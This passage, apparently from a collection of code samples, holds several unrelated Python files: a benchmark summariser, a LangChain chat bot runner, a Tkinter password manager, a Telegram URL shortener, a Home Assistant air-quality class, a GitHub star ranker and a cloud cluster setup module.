st.sidebar.button(\"G\u00f6nder\"):\r\n#     file_exists = os.path.isfile('feedback.csv')\r\n#     mode = 'a' if file_exists else 'w'\r\n#     with open('feedback.csv', mode, newline='', encoding='utf-8') as file:\r\n#         writer = csv.writer(file)\r\n#         if not file_exists:\r\n#             writer.writerow(['Ge",
    "import argparse\nimport json\nimport logging\nimport os\nimport time\nimport math\nimport os\nimport requests\nimport base64\nimport json\nimport shutil\nfrom collections import defaultdict\n\nfrom pytablewriter import MarkdownTableWriter\n\nGITHUB_API_TOKEN = os.getenv(\"GITHUB_API_TOKEN\")\n\n\ndef _make_summary(directory: str, model_name: str, benchmark: str) -> str:\n    # Variables\n    tables = []\n    averages = []\n    tasks = []\n    for test_file in os.listdir(directory):\n        test_file_path = os.path.join(directory, test_file)\n        print(f\"test_file_path = {test_file_path}\")\n        if test_file.endswith(\".json\"):\n            # Check if this is a dir or file\n            if os.path.isdir(test_file_path):\n                new_dir_path = os.path.join(directory, \"results_temp\")\n                if not os.path.exists(new_dir_path):\n                    os.makedirs(new_dir_path)\n                # This is new path!\n                for sub_dir in os.listdir(test_file_path):\n                    sub_dir_path = os.path.join(test_file_path, sub_dir)\n                    if os.path.isdir(sub_dir_path):\n                        for result_file in os.listdir(sub_dir_path):\n                            result_file_path = os.path.join(sub_dir_path, result_file)\n                            if result_file.startswith(\n                                \"results_\"\n                            ) and result_file.endswith(\".json\"):\n                                task, _ = os.path.splitext(test_file)\n                                # Find json file within this dir\n                                json_data = open(result_file_path, \"r\").read()\n                                data = json.loads(json_data, strict=False)\n                                table, average = make_table(data, task, benchmark)\n                                tables.append(table)\n                                tasks.append(task)\n                                averages.append(average)\n                                # Move dir\n\n                                new_file_name = f\"{task}.json\"\n                                new_file_path = os.path.join(\n                                    new_dir_path, new_file_name\n                                )\n                                shutil.move(result_file_path, new_file_path)\n                                print(\n                                    f\"Moved and renamed {result_file_path} to {new_file_path}\"\n                                )\n\n                                # Remove the sub_dir\n                                shutil.rmtree(test_file_path)\n                                print(f\"Removed directory: {test_file_path}\")\n\n                                # Move the json files\n                                parent_dir = directory\n                                for file in os.listdir(new_dir_path):\n                                    if file.endswith(\".json\"):\n                                        file_path = os.path.join(new_dir_path, file)\n                                        new_file_path = os.path.join(parent_dir, file)\n                                        shutil.move(file_path, new_file_path)\n                                        print(f\"Moved {file_path} to {new_file_path}\")\n\n            else:\n                task, _ = os.path.splitext(test_file)\n                # This is file, go with old flow\n                json_data = open(test_file_path, \"r\").read()\n                data = json.loads(json_data, strict=False)\n                table, average = make_table(data, task, benchmark)\n                tables.append(table)\n                tasks.append(task)\n                averages.append(average)\n\n    # Generate tables\n    summary = \"\"\n    for index, task in enumerate(tasks):\n        summary += f\"### {task}\\n{tables[index]}\\nAverage: {averages[index]}%\\n\\n\"\n    result_dict = {k: v for k, v in zip(tasks, averages)}\n\n    # Calculate the final average, excluding strings\n    if all(isinstance(e, float) for e in averages):\n        final_average = round(sum(averages) / len(averages), 2)\n        summary += f\"Average score: {final_average}%\"\n        result_dict.update({\"Average\": final_average})\n    else:\n        summary += \"Average score: Not available due to errors\"\n\n    # Generate final table\n    final_table = make_final_table(result_dict, model_name, benchmark)\n    final_table_json = make_final_table_json(result_dict, model_name, benchmark)\n    summary = final_table + \"\\n\" + summary\n\n    # Read elapsed time from json\n\n    return final_table_json, summary\n\n    # Tasks\n    # if BENCHMARK == \"openllm\":\n    #     tasks = [\"ARC\", \"HellaSwag\", \"MMLU\", \"TruthfulQA\", \"Winogrande\", \"GSM8K\"]\n    # elif BENCHMARK == \"nous\":\n    #     tasks = [\"AGIEval\", \"GPT4All\", \"TruthfulQA\", \"Bigbench\"]\n    # elif BENCHMARK == \"eq-bench\":\n    #     tasks = [\"EQ-Bench\"]\n    # else:\n    #     raise NotImplementedError(\n    #         f\"The benchmark {BENCHMARK} could not be found.\"\n    #     )\n\n\ndef make_final_table(result_dict, model_name, benchm",
    "import os\nimport sys\nfrom sys import argv\nimport shutil\nimport requests\nimport json\nimport time\nimport base64\n\n# \u6587\u6863\u52a0\u5de5\nfrom langchain_community.document_loaders import DirectoryLoader, UnstructuredWordDocumentLoader, UnstructuredHTMLLoader, UnstructuredMarkdownLoader, PythonLoader \n\n# \u4ece\u6587\u4ef6\u5bfc\u5165\nfrom send import *\nfrom models_load import *\nfrom dal import get_user_state_from_db\n\n# \u5f02\u6b65\u51fd\u6570\nimport asyncio\n\n\n\n\nprint(f\"\u63a5\u6536\u5230\u7684\u53c2\u6570\uff1a{sys.argv}\")\n\n\n# time.sleep(10000)\n\nembedding_data_path = sys.argv[1]\nquestion = json.loads(base64.b64decode(sys.argv[2]).decode())\nchat_type = str(sys.argv[3])\nuser_id = str(sys.argv[4])\ngroup_id = str(sys.argv[5])\nat = str(sys.argv[6])\nsource_id = str(sys.argv[7])\nuser_state = str(sys.argv[8])\nbot_nick_name = str(sys.argv[9])\nuser_nick_name = str(sys.argv[10])\n\n\n\nprint(\"*\" * 40)\nprint(f\"embedding_data_path:\", embedding_data_path)\nprint(f\"question:\", question)\nprint(f\"chat_type:\", chat_type)\nprint(f\"user_id:\", user_id)\nprint(f\"group_id:\", group_id)\nprint(f\"at:\", at)\nprint(f\"source_id:\", source_id)\nprint(f\"user_state:\", user_state)\nprint(f\"bot_nick_name:\", bot_nick_name)\nprint(f\"user_nick_name:\", user_nick_name)\nprint(\"*\" * 40)\n\n# time.sleep(100)\n\n# \u6587\u4ef6\u5939\u52a0\u8f7d\u5668\u51fd\u6570\ndef load_documents(data_path):\n    print(\"\u6b63\u5728\u52a0\u8f7d\" + data_path + \"\u4e0b\u7684\u6240\u6709\u6587\u6863...\")\n    try:\n        loader = DirectoryLoader(data_path, show_progress=True, use_multithreading=True)\n        loaders = loader.load()\n        print(loaders)\n        return loaders\n    except Exception as e:\n        print(e)\n        return f\"\u52a0\u8f7d\u6587\u6863\u51fa\u9519\uff1a{e}\"\n\n\n\nname_space = get_user_name_space(user_id, source_id)\n\n\n# \u8c03\u7528\u901a\u7528\u804a\u5929\u5f97\u51fa\u7b54\u6848\n# try:\n# \u6e05\u9664\u539f\u6765\u7684\u804a\u5929\u5386\u53f2\n# delete_all_records(source_id, user_state, name_space)\nquery = f\"{load_documents(embedding_data_path)}\\n{question}\"\n\n# \u5c06\u804a\u5929\u8bf7\u6c42\u5199\u5165\u8bb0\u5f55\nif at == \"yes\":\n    query_insert = \"@\" + bot_nick_name + \" \" + query\nelse:\n    query_insert = query\ninsert_chat_history(query_insert, source_id, user_nick_name, user_state, name_space)\n\n\ntry:\n    response_message = asyncio.run(chat_generic_langchain(bot_nick_name, user_nick_name, source_id, query, user_state, name_space))\n    # \u5982\u679c\u662f\u804a\u5929\u72b6\u6001\uff0c\u95ee\u7b54\u5b8c\u6210\u7acb\u5373\u5220\u9664\u6587\u4ef6\n    if user_state == \"\u804a\u5929\":\n        shutil.rmtree(embedding_data_path)\nexcept Exception as e:\n    response_message = f\"\u9519\u8bef\uff1a{e}\"\n    shutil.rmtree(embedding_data_path)\n    \n\n# \u6253\u5370\u7b54\u6848\uff0c\u53d1\u9001\u6d88\u606f\nprint(\"*\" * 40)\nprint(f\"\u7b54\u6848\uff1a {response_message}\")\n# \u53d1\u9001\u6d88\u606f\nasyncio.run(answer_action(chat_type, user_id, group_id, at, response_message))\n\n\n# \u83b7\u53d6user_state\u548cname_space\nname_space = get_user_name_space(user_id, source_id)\n# from dal import get_user_state_from_db\nuser_state = get_user_state_from_db(user_id, source_id)\n\n# \u5c06\u804a\u5929\u56de\u590d\u5199\u5165\u804a\u5929\u5386\u53f2\u8bb0\u5f55\nif at == \"yes\":\n    response_message_insert = \"@\" + user_nick_name + \" \" + response_message\nelse:\n    response_message_insert = response_message\ninsert_chat_history(response_message_insert, source_id, bot_nick_name, user_state, name_space)\n\n\n\n\n\n\n\n\n\n\n\n",
    "import argparse\nimport json\n\ndef read_jsonl_file(file_path):\n    data_list = []\n    with open(file_path, 'r') as file:\n        for line in file:\n            data = json.loads(line)\n            # Process the data as needed\n            data_list.append(data)\n    return data_list\n\n\ndef change_to_animatediff_prompt(storyboardlist, max_frame = 100, ext_prompt = None, expositive = None):\n    # Convert the storyboard to the format required by the model\n    # framecnt = 0\n    res = {}\n    framecnt = len(storyboardlist)\n    idx = 0\n    for storyboard in storyboardlist:\n        res[idx * max_frame // framecnt] = f'{expositive},{storyboard.get(\"person\", \"1boy\")},{storyboard.get(\"age\", 0)} years old,{\"old,white hair\" if storyboard.get(\"age\", 0) > 60 else \"\"},{storyboard.get(\"screen_description\", \"\")},{storyboard.get(\"time\", \"\")},{storyboard.get(\"status\", \"\")},{storyboard.get(\"scene\", \"\")},{ext_prompt if ext_prompt else \"\"}'\n        idx += 1\n        # print(f'\"{framecnt}\" : \"a handsome man,{storyboard[\"person\"]},{storyboard[\"age\"]} year old,{storyboard[\"time\"]},{storyboard[\"action\"]},{storyboard[\"scene\"]}\",')\n        # framecnt += 10   \n        # Process the storyboard as needed\n    return res\n\ndef generate_animatediff_config(storyboard, model = None,\n                                 lora_model = None, negative_prompt = None, animatediff_motion_model = None):\n    configTemplate = json.load(open('config_template/template.json'))\n\n    configTemplate['prompt_map'] = storyboard\n\n    if model:\n        configTemplate['path'] = model\n\n    if lora_model:\n        configTemplate['lora_map'] = {f'../../faceoutput/{lora_model}': 1.0}\n    \n    if negative_prompt:\n        configTemplate['n_prompt'] = [negative_prompt]\n    if animatediff_motion_model:\n        configTemplate['motion_module'] = animatediff_motion_model\n\n\n    # \u83b7\u53d6\u5f53\u524d\u65f6\u95f4\u4f5c\u4e3a\u6587\u4ef6\u540d\n    import time\n    filename = time.strftime(\"%Y%m%d%H%M%S\", time.localtime())\n    filename = f'out_config/config{filename}.json'\n    json.dump(configTemplate, open(filename, 'w'), indent=4)\n    return filename, json.dumps(configTemplate['prompt_map'])[1:-1]\n\n\nif __name__ == '__main__':\n    parser = argparse.ArgumentParser(description='Read JSONL file')\n    parser.add_argument('file', help='Path to the JSONL file')\n    args = parser.parse_args()\n\n    storyboardlist = read_jsonl_file(args.file)\n    change_to_animatediff_prompt(storyboardlist)\n\n\n",
    "import argparse\nimport torch\nfrom PackDataset import packDataset_util_bert\nimport torch.nn as nn\nimport torch.nn.functional as F\nfrom transformers import BertForSequenceClassification, LlamaForSequenceClassification, LlamaTokenizer\nimport transformers\nfrom transformers import (\n    AdamW, AutoConfig, AutoModelForSequenceClassification, AutoTokenizer\n)\nimport os\nfrom torch.nn.utils import clip_grad_norm_\nimport csv\nfrom tqdm import tqdm\nfrom torch.optim.lr_scheduler import LambdaLR\nimport random\nimport numpy as np\n\n\ndef read_data(file_path):\n    import pandas as pd\n    data = pd.read_csv(file_path, sep='\\t').values.tolist()\n    sentences = [item[0] for item in data]\n    labels = [int(item[1]) for item in data]\n    processed_data = [(sentences[i], labels[i]) for i in range(len(labels))]\n    return processed_data\n\n\ndef get_all_data(base_path):\n    train_path = os.path.join(base_path, 'train.tsv')\n    dev_path = os.path.join(base_path, 'dev.tsv')\n    test_path = os.path.join(base_path, 'test.tsv')\n    train_data = read_data(train_path)\n    dev_data = read_data(dev_path)\n    test_data = read_data(test_path)\n    return train_data, dev_data, test_data\n\n\ndef evaluaion(loader):\n    model.eval()\n    total_number = 0\n    total_correct = 0\n    with torch.no_grad():\n        for padded_text, attention_masks, labels in loader:\n            if torch.cuda.is_available():\n                padded_text,attention_masks, labels = padded_text.cuda(), attention_masks.cuda(), labels.cuda()\n            output = model(padded_text, attention_masks)[0]\n            _, idx = torch.max(output, dim=1)\n            correct = (idx == labels).sum().item()\n            total_correct += correct\n            total_number += labels.size(0)\n        acc = total_correct / total_number\n        return acc\n\n\ndef small_eval(loader):\n    bias_model.eval()\n    total_number = 0\n    total_correct = 0\n    with torch.no_grad():\n        for padded_text, attention_masks, labels in loader:\n            if torch.cuda.is_available():\n                padded_text, attention_masks, labels = padded_text.cuda(), attention_masks.cuda(), labels.cuda()\n            output = bias_model(padded_text, attention_masks)[0]\n            _, idx = torch.max(output, dim=1)\n            correct = (idx == labels).sum().item()\n            total_correct += correct\n            total_number += labels.size(0)\n        acc = total_correct / total_number\n        return acc\n\n\ndef poe_with_r_drop_loss(output, output_2, out_3, labels):\n    \"\"\"Implements the combination of poe loss & r-drop loss.\"\"\"\n    pt = F.softmax(output, dim=1)\n    pt_3 = F.softmax(out_3, dim=1)\n    pt_2 = F.softmax(output_2/args.temperature, dim=1)\n    joint_pt = F.softmax((0.5 * (torch.log(pt) + torch.log(pt_3)) + args.poe_alpha * torch.log(pt_2)), dim=1)\n    joint_p = joint_pt.gather(1, labels.view(-1, 1))\n\n    p_loss = F.kl_div(F.log_softmax(output, dim=-1), F.softmax(out_3, dim=-1), reduction='none')\n    q_loss = F.kl_div(F.log_softmax(out_3, dim=-1), F.softmax(output, dim=-1), reduction='none')\n\n    batch_loss = -torch.log(joint_p) + args.rdrop_alpha * (p_loss + q_loss) / 2\n    loss = batch_loss.mean()\n    return loss\n\n\ndef poe_loss(output, output_2, labels):\n    \"\"\"Implements the product of expert loss.\"\"\"\n    pt = F.softmax(output, dim=1)\n    pt_2 = F.softmax(output_2 / args.temperature, dim=1)\n    joint_pt = F.softmax((torch.log(pt) + args.poe_alpha * torch.log(pt_2)), dim=1)\n    joint_p = joint_pt.gather(1, labels.view(-1, 1))\n    batch_loss = -torch.log(joint_p)\n    bias_p = F.softmax(output_2, dim=1)\n    bias_p = bias_p.gather(1, labels.view(-1, 1))\n    bias_loss = -torch.log(bias_p)\n    if args.do_reweight:\n        logits_1 = F.softmax(output, dim=1)\n        logits_1 = logits_1.gather(1, labels.view(-1, 1))\n        logits_2 = F.softmax(output_2, dim=1)\n        logits_2 = logits_2.gather(1, labels.view(-1, 1))\n        weight_main = torch.where(logits_2 > args.reweight_threshold, 1.0 - logits_2, 1.0)\n        weight_bias = torch.where(logits_1 < 0.5, logits_1, 1.0)\n        # batch_loss = batch_loss * weight_main + bias_loss * weight_bias\n        batch_loss = batch_loss * weight_main\n    else:\n        # batch_loss = batch_loss + bias_loss\n        batch_loss = batch_loss\n    loss = batch_loss.mean()\n    return loss\n\n\ndef poe_label_smoothing_loss(output, output_2, labels):\n    \"\"\"Implements the poe & label smoothing loss.\"\"\"\n    alpha = args.smooth_alpha\n    N = output.size(0)  # batch_size\n    C = output.size(1)  # number of classes\n    smoothed_labels = torch.full(size=(N, C), fill_value=alpha / (C - 1)).cuda()\n    smoothed_labels.scatter_(dim=1, index=torch.unsqueeze(labels, dim=1), value=1 - alpha)\n\n    # log_prob = torch.nn.functional.log_softmax(outputs, dim=1)\n    # loss = -torch.sum(log_prob * smoothed_labels) / N\n\n    pt = F.softmax(output, dim=1)\n    # pt_2 = F.softmax(output_2 / args.temperature, dim=1)\n    pt_2 = F.softmax(output_2, dim=1)\n    joint_pt = F.log_softmax((torch.log(pt) + torch.log(pt_2)), dim=1)\n    ",
    "from tkinter import *\nfrom tkinter import messagebox\nfrom random import choice, randint, shuffle\nimport json\n\n\n# ---------------------------- PASSWORD GENERATOR ------------------------------- #\n\n#Password Generator Project\ndef generate_password():\n    letters = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z']\n    numbers = ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9']\n    symbols = ['!', '#', '$', '%', '&', '(', ')', '*', '+']\n\n    password_letters = [choice(letters) for _ in range(randint(8, 10))]\n    password_symbols = [choice(symbols) for _ in range(randint(2, 4))]\n    password_numbers = [choice(numbers) for _ in range(randint(2, 4))]\n\n    password_list = password_letters + password_symbols + password_numbers\n    shuffle(password_list)\n\n    password = \"\".join(password_list)\n    password_entry.insert(0, password)\n\n# ---------------------------- SAVE PASSWORD ------------------------------- #\ndef save():\n\n    website = website_entry.get()\n    email = email_entry.get()\n    password = password_entry.get()\n    new_data = {\n        website: {\n            \"email\": email,\n            \"password\": password,\n        }\n    }\n\n    if len(website) == 0 or len(password) == 0:\n        messagebox.showinfo(title=\"Oops\", message=\"Please make sure you haven't left any fields empty.\")\n    else:\n        is_ok = messagebox.askokcancel(title = website, message = f'These are the details entered : \\nEmail: {email}\\n Password: {password}\\nIs it okay to save it?')\n        if is_ok:\n            try:\n                with open(\"data.json\", \"r\") as data_file:\n                    #Reading old data\n                    data = json.load(data_file)\n            except FileNotFoundError:\n                with open(\"data.json\", \"w\") as data_file:\n                    json.dump(new_data, data_file, indent=4)\n            else:\n                #Updating old data with new data\n                data.update(new_data)\n\n                with open(\"data.json\", \"w\") as data_file:\n                    #Saving updated data\n                    json.dump(data, data_file, indent=4)\n            finally:\n                website_entry.delete(0, END)\n                password_entry.delete(0, END)\n\n\n# ---------------------------- FIND PASSWORD ------------------------------- #\ndef find_password():\n    website = website_entry.get()\n    try:\n        with open(\"data.json\") as data_file:\n            data = json.load(data_file)\n    except FileNotFoundError:\n        messagebox.showinfo(title=\"Error\", message=\"No Data File Found.\")\n    else:\n        if website in data:\n            email = data[website][\"email\"]\n            password = data[website][\"password\"]\n            messagebox.showinfo(title=website, message=f\"Email: {email}\\nPassword: {password}\")\n        else:\n            messagebox.showinfo(title=\"Error\", message=f\"No details for {website} exists.\")\n\n\n# ---------------------------- UI SETUP ------------------------------- #\n\nwindow = Tk()\nwindow.title(\"Password Manager\")\nwindow.config(padx=50, pady=50)\n\ncanvas = Canvas(height=200, width=200)\nlogo_img = PhotoImage(file=\"logo.png\")\ncanvas.create_image(100, 100, image=logo_img)\ncanvas.grid(row=0, column=1)\n\n#Labels\nwebsite_label = Label(text=\"Website:\")\nwebsite_label.grid(row=1, column=0)\n\nemail_label = Label(text=\"Email/Username:\")\nemail_label.grid(row=2, column=0)\n\npassword_label = Label(text=\"Password:\")\npassword_label.grid(row=3, column=0)\n\n#Entries\nwebsite_entry = Entry(width=21)\nwebsite_entry.grid(row=1, column=1)\nwebsite_entry.focus()\n\nemail_entry = Entry(width=35)\nemail_entry.grid(row=2, column=1, columnspan=2)\nemail_entry.insert(0, \"abc@gmail.com\")\n\npassword_entry = Entry(width=21)\npassword_entry.grid(row=3, column=1)\n\n# Buttons\nsearch_button = Button(text=\"Search\", width=13, command=find_password)\nsearch_button.grid(row=1, column=2)\n\ngenerate_password_button = Button(text=\"Generate Password\", command=generate_password)\ngenerate_password_button.grid(row=3, column=2)\n\nadd_button = Button(text=\"Add\", width=36, command=save)\nadd_button.grid(row=4, column=1, columnspan=2)\n\nwindow.mainloop()",
    "from pyrogram import Client, enums, filters, idle\n\nimport re\nfrom requests import get\nimport asyncio\nfrom JarvisRobo import pbot as jarvis\n\nfrom pyrogram.types import InlineKeyboardButton as ikb, InlineKeyboardMarkup as ikm, Message\nfrom pyrogram.enums import ChatAction, ParseMode\nimport pyshorteners\nshortener = pyshorteners.Shortener()\nfrom pyrogram.handlers import MessageHandler\n\n@jarvis.on_message(filters.command([\"short\"]))\nasync def short_urls(bot, message):\n    await bot.send_chat_action(message.chat.id, ChatAction.TYPING)\n    if len(message.command) < 2:\n        return await message.reply_text(\n            \"**Example:**\\n\\n`/short [url]`\")\n#     url_pattern = re.compile(r'https?://\\S+')\n    link=message.command[1]\n#     link = url_pattern.findall(urls)\n\n# Check if any URLs were found\n#     if link not in urls:\n#                         return\tawait message.reply_text(\"this is not valid provide url\")\n#     else:                         \n    try:\n\n        tiny_link = shortener.tinyurl.short(link)\n\n\n        dagd_link = shortener.dagd.short(link)\n\n        clckru_link = shortener.clckru.short(link)\n\n        shorted=[tiny_link,dagd_link,clckru_link]\n        url=[\n        [ikb(\"Tiny Url\",url=tiny_link)],\n\n        [ikb(\"Dagd Url\",url=dagd_link),\n\n         ikb(\"Clckru Url\",url=clckru_link)\n        ]\n        ]\n        await message.reply_text(f\"Here are few shortened links :\",reply_markup=ikm(url))\n\n    except Exception as e:\n        await message.reply_text(f\"Either the link is already shortened or is invalid.\")\n\n@jarvis.on_message(filters.command([\"unshort\"]))\nasync def unshort(bot, message):\n    await bot.send_chat_action(message.chat.id, ChatAction.TYPING)\n    if len(message.command) < 2:\n        return await message.reply_text(\n            \"**Example:**\\n\\n`/unshort [short - url]`\")\n    link=message.text.split(' ')[1]\n    \n    try:\n\n        x = get(link, allow_redirects=True).url\n\n        url=[\n\n        [ikb\n\n         (\"View Link\",url=x)\n\n        ]\n\n        ]\n\n        \n\n        await message.reply_text(f\"Here's the unshortened link :\\n`{x}` \" ,reply_markup=ikm(url))\n\n        \n\n    except Exception as e:\n\n        await message.reply_text(f\"\u1d07\u0280\u0280\u1d0f\u0280:    {e} \")\n\n__help__ = \"\"\"\n\u1d0d\u1d00\u1d0b\u1d07 s\u029c\u1d0f\u0280\u1d1bs \u1d0f\u0493 \u1d00 \u0262\u026a\u1d20\u1d07\u0274 \u029f\u026a\u0274\u1d0b \n \u274d /short <url>  *:Example `/short https://t.me/mr_sukkun`.\n *\"\"\"\n\n__mod_name__ = \"S\u029c\u1d0f\u0280\u1d1b\u1d07\u0274\u1d07\u0280\"\n",
    "from __future__ import annotations\n\nfrom homeassistant.core import HomeAssistant\nfrom .air_quality_data import CHMUAirQuality\nfrom collections.abc import Callable\nfrom .const import DOMAIN\n\n\nclass AirQuality:\n    \"\"\"Setting Air Quality Station as device.\"\"\"\n\n    def __init__(self, hass: HomeAssistant, station: str, data) -> None:\n        \"\"\"Initialize departure board.\"\"\"\n        self._hass: HomeAssistant = hass\n        self._station: str = station\n        self._callbacks = set()\n        self.data: dict = data\n\n    @property\n    def device_info(self):\n        \"\"\" Provides a device info. \"\"\"\n        return {\"identifiers\": {(DOMAIN, self._station)}, \"name\": self.name, \"manufacturer\": \"Czech Hydrometeorological Institute\"}\n\n    @property\n    def name(self) -> str:\n        \"\"\"Provides name for station.\"\"\"\n        return self._station\n\n    @property\n    def index(self) -> str:\n        \"\"\" Returns air quality index.\"\"\"\n        return self.data[\"station_data\"][\"Ix\"]\n\n    @property\n    def latitude(self) -> str:\n        \"\"\" Returns latitude of the station.\"\"\"\n        return self.data[\"station_data\"][\"Lat\"]\n\n    @property\n    def longitude(self) -> str:\n        \"\"\"Returns longitude of the station.\"\"\"\n        return self.data[\"station_data\"][\"Lon\"]\n\n    @property\n    def owner(self):\n        return self.data[\"station_data\"][\"Owner\"]\n\n    @property\n    def code(self) -> str:\n        \"\"\"Returns code of the station\"\"\"\n        return self.data[\"station_data\"][\"Code\"]\n\n    @property\n    def classification(self) -> tuple:\n        \"\"\" Returns classification of the station.\"\"\"\n        return self.data[\"station_data\"][\"Classif\"]\n\n    @property\n    def measurements(self) -> list:\n        \"\"\" Returns measurement from the station.\"\"\"\n        return self.data[\"station_data\"][\"Components\"]\n\n    @property\n    def data_updated(self) -> str:\n        \"\"\" Timestamp of the last update of data\"\"\"\n        return self.data[\"updated\"]\n\n    async def async_update(self) -> None:\n        \"\"\" Updates the data from API.\"\"\"\n        data = await self._hass.async_add_executor_job(CHMUAirQuality.update_info, self._station)\n        if self.data_updated != data[\"updated\"]:\n            self.data = data\n            await self.publish_updates()\n\n    def register_callback(self, callback: Callable[[], None]) -> None:\n        \"\"\"Register callback, called when there are new data.\"\"\"\n        self._callbacks.add(callback)\n\n    def remove_callback(self, callback: Callable[[], None]) -> None:\n        \"\"\"Remove previously registered callback.\"\"\"\n        self._callbacks.discard(callback)\n\n    async def publish_updates(self) -> None:\n        \"\"\"Schedule call to all registered callbacks.\"\"\"\n        for callback in self._callbacks:\n            callback()\n",
    "# encoding: utf-8\n\"\"\"\n@author:  xingyu liao\n@contact: sherlockliao01@gmail.com\n\"\"\"\n\nimport torch\nfrom fastreid.modeling.meta_arch import Baseline\nfrom fastreid.modeling.meta_arch import META_ARCH_REGISTRY\n\n\n@META_ARCH_REGISTRY.register()\nclass FaceBaseline(Baseline):\n    def __init__(self, cfg):\n        super().__init__(cfg)\n        self.pfc_enabled = cfg.MODEL.HEADS.PFC.ENABLED\n        self.amp_enabled = cfg.SOLVER.AMP.ENABLED\n\n    def forward(self, batched_inputs):\n        if not self.pfc_enabled:\n            return super().forward(batched_inputs)\n\n        images = self.preprocess_image(batched_inputs)\n        with torch.cuda.amp.autocast(self.amp_enabled):\n            features = self.backbone(images)\n        features = features.float() if self.amp_enabled else features\n\n        if self.training:\n            assert \"targets\" in batched_inputs, \"Person ID annotation are missing in training!\"\n            targets = batched_inputs[\"targets\"]\n\n            # PreciseBN flag, When do preciseBN on different dataset, the number of classes in new dataset\n            # may be larger than that in the original dataset, so the circle/arcface will\n            # throw an error. We just set all the targets to 0 to avoid this problem.\n            if targets.sum() < 0: targets.zero_()\n\n            outputs = self.heads(features, targets)\n            return outputs, targets\n        else:\n            outputs = self.heads(features)\n            return outputs\n",
    "from tqdm import tqdm\nimport requests\nimport json\nimport time\nimport os\n\n# Environment variable for GitHub Token, you can get your token here: https://github.com/settings/tokens/\nGITHUB_TOKEN = os.environ.get('GITHUB_TOKEN')\n\n# URLs\nCUSTOM_NODE_LIST_URL = 'https://raw.githubusercontent.com/ltdrdata/ComfyUI-Manager/main/custom-node-list.json'\nOUTPUT_FILENAME = 'custom-node-list.json'\nCACHE_FILENAME = '.star-count-cache.json'\n\ndef fetch_custom_node_list(url):\n    response = requests.get(url)\n    if response.status_code == 200:\n        return response.json()\n    else:\n        raise Exception(f\"Failed to fetch the custom node list: HTTP {response.status_code}\")\n\ndef get_star_count(repo_url, cache):\n    # Use the cache to avoid unnecessary API calls\n    if repo_url in cache:\n        return cache[repo_url]\n\n    api_url = f\"https://api.github.com/repos/{'/'.join(repo_url.split('/')[-2:])}\"\n    headers = {'Authorization': f'token {GITHUB_TOKEN}'} if GITHUB_TOKEN else {}\n    \n    response = requests.get(api_url, headers=headers)\n    time.sleep(0.1)  # Respectful pause to avoid hitting GitHub API rate limit\n    if response.status_code == 200:\n        star_count = response.json().get('stargazers_count', 0)\n        cache[repo_url] = star_count  # Update the cache\n        return star_count\n    else:\n        print(f\"Failed to fetch star count for {repo_url}: HTTP {response.status_code}\")\n        return 0\n\ndef load_cache():\n    try:\n        with open(CACHE_FILENAME, 'r', encoding='utf-8') as file:\n            return json.load(file)\n    except FileNotFoundError:\n        return {}  # Return an empty cache if the file does not exist\n\ndef save_cache(cache):\n    with open(CACHE_FILENAME, 'w', encoding='utf-8') as file:\n        json.dump(cache, file, ensure_ascii=False, indent=4)\n\ndef print_awesome_list(data, top_n=20):\n    print(\"## Awesome List of ComfyUI Manager Custom Nodes\\n\")\n    print(\"Discover the most popular and community-endorsed custom nodes for ComfyUI Manager, \"\n          \"meticulously ranked by their GitHub Stars as on April 1, 2024.\\n\")\n    for i, node in enumerate(data['custom_nodes'][:top_n], 1):\n        print(f\"No. {i}: [{node['title']}] {node['reference']} (Star: {node['star']})\\n\")\n\ndef main():\n    # Load cache\n    cache = load_cache()\n\n    print(f\"Fetch the custom node list from {CUSTOM_NODE_LIST_URL}\")\n    data = fetch_custom_node_list(CUSTOM_NODE_LIST_URL)\n\n    # Update star counts with caching and progress bar\n    for node in tqdm(data['custom_nodes'], desc='Fetching star counts', unit='node'):\n        star_count = get_star_count(node['reference'], cache)\n        node['star'] = star_count\n        save_cache(cache)  # Save cache after each API call to preserve progress\n\n    # Sort the custom nodes by star count\n    data['custom_nodes'].sort(key=lambda x: x['star'], reverse=True)\n\n    # Write the updated and sorted data to the output file\n    with open(OUTPUT_FILENAME, 'w', encoding='utf-8') as file:\n        json.dump(data, file, ensure_ascii=False, indent=4)\n    \n    # Print the Awesome List to console\n    print_awesome_list(data)\n\n    print(f\"Ranked custom node list written to {OUTPUT_FILENAME}\")\n\nif __name__ == \"__main__\":\n    main()\n",
    "\"\"\"\nThis needs to be run once per project or the port 8080 will not be open!\n```\nfrom google.cloud.compute_v1 import Firewall, FirewallsClient, Allowed\nfirewall = Firewall(\n    name=\"burla-cluster-node-firewall\",\n    allowed=[Allowed(I_p_protocol=\"tcp\", ports=[\"8080\"])],\n    direction=\"INGRESS\",\n    network=\"global/networks/default\",\n    target_tags=[\"burla-cluster-node\"],\n)\nFirewallsClient().insert(project=PROJECT_ID, firewall_resource=firewall).result()\n```\n\nThe disk image was built by creating a blank debian-12 instance then running the following:\n(basically just installs git, docker, and gcloud, and authenticates docker using gcloud.)\n```\napt-get update && apt-get install -y git ca-certificates curl gnupg\napt install -y python3-pip\n\ninstall -m 0755 -d /etc/apt/keyrings\ncurl -fsSL https://download.docker.com/linux/debian/gpg | gpg --dearmor -o /etc/apt/keyrings/docker.gpg\nchmod a+r /etc/apt/keyrings/docker.gpg\necho \\\n  \"deb [arch=$(dpkg --print-architecture) signed-by=/etc/apt/keyrings/docker.gpg] https://download.docker.com/linux/debian \\\n  $(. /etc/os-release && echo \"$VERSION_CODENAME\") stable\" | \\\n  tee /etc/apt/sources.list.d/docker.list > /dev/null\napt-get update\napt-get install docker-ce docker-ce-cli containerd.io docker-buildx-plugin docker-compose-plugin\n\n# install gcloud and use it to authenticate docker with GAR also\n```\n\"\"\"\n\nimport os\nimport requests\nfrom requests.exceptions import ConnectionError, ConnectTimeout, Timeout\nfrom time import sleep, time\nfrom uuid import uuid4\nfrom typing import Optional\nfrom datetime import datetime, timedelta\n\nfrom fastapi import BackgroundTasks\nfrom google.api_core.exceptions import NotFound, ServiceUnavailable\nfrom google.cloud import firestore\nfrom google.cloud.firestore import SERVER_TIMESTAMP\nfrom google.cloud.compute_v1 import (\n    AttachedDisk,\n    NetworkInterface,\n    AttachedDiskInitializeParams,\n    